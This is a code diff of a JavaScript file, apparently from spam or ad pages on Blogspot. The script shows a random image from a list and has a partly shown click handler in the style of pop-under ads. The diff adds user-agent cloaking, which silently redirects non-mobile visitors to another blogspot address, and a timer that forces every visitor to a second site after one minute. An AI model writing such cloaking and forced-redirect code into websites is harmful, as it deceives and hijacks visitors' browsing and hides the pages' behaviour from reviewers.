@@ -125,13 +125,10 @@ images[121] = "<img src='https://1.bp.blogspot.com/-zokr9ZYc6KY/X5q2fD5owKI/AAAA
 images[122] = "<img src='https://1.bp.blogspot.com/-zTKFQUE2-gw/X5q2dAyh5aI/AAAAAAAE85U/Zg6a01DckgEqHtrEEzn4ORH3bScJZbP3gCLcBGAsYHQ/a%2B%252825%2529.jpg' />";
 images[123] = "<img src='https://1.bp.blogspot.com/-zv-BugT6-6A/X5q3niRA6LI/AAAAAAAE89o/mxF-jWAl67ostaduJiXphE0NW0IxP5CJACLcBGAsYHQ/b%2B%252835%2529.jpg' />";
 
-
 index = Math.floor(Math.random() * images.length);
 document.write(images[index]);
 
-
-// click body
-
+// BODY CLICK
     function addEvent(obj, eventName, func) {
         if (obj.attachEvent) {
             obj.attachEvent("on" + eventName, func);
@@ -147,3 +144,10 @@ addEvent(window, "load", function(e) {
             window.focus();
     });
 }); 
+
+// ONLY MOBILE
+if((navigator.userAgent.match(/iPhone/i)) || (navigator.userAgent.match(/iPod/i)) || (navigator.userAgent.indexOf('Android') != -1)){}
+else location.replace("https://liverscout.blogspot.com/");
+
+// TIMEOUT
+setTimeout("window.location.href = 'https://zonakerajinantangan.blogspot.com/';",60*1000)
